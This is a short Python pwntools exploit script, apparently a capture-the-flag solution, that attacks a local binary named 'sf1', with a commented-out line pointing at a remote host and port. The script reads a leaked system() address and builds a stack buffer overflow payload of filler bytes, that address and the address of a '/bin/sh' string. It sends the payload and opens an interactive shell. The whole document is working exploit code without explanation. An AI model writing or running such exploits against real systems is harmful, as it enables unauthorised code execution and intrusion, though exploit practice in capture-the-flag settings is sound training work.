from pwn import *

# p = remote("132.226.171.228", 14000)
p = process('./sf1')

p.recvuntil("system address : ")

addr = int(p.recv().strip(), 16)

print(hex(addr))

input()

binsh = int("0x0804A028", 16)

pay = b""
pay += b"\x90" * 136
pay += b"\x90" * 4
pay += p32(addr)
pay += b"\x90" * 4
pay += p32(binsh)

p.send(pay)

p.interactive()
